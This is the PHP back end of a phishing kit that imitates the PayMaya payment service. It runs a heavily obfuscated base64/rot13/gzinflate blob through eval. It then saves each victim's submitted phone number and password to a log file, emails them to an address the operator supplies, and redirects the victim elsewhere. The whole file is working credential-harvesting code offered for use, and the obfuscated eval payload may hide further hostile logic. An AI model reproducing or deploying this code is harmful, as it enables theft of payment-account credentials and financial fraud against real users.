<?php
include("anti.php");
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/* ---[ Saving Phone Number and Password in a file ]--- */
$f = fopen("paymaya-logs.txt", "a");
fwrite($f, "Phone Number: " . $_POST['number'] . "\nPassword: " . $_POST['passwd'] . "\n\n---\n\n");
fclose($f);

/* ---[ Sending Phone Number and Password in your damn email ]--- */
$to = 'lagay mo dito email mo';
$subject = 'PayMaya Logs';
$message = 'PayMaya Info 2 <br>Number: ' . $_POST['number'] . '<br>Password: ' . $_POST['passwd'];
$header = array(
    'From' => 'PayMaya Fish 2',
    'Reply-To' => 'PayMaya Fish 1',
    'X-Mailer' => 'PHP/' . phpversion()

);
@mail($to, $subject, $message, $header);

/* ---[ Redirect ]--- */
$redirect_to = 'Enter any url here';
header("Location: " . $redirect_to);
?>
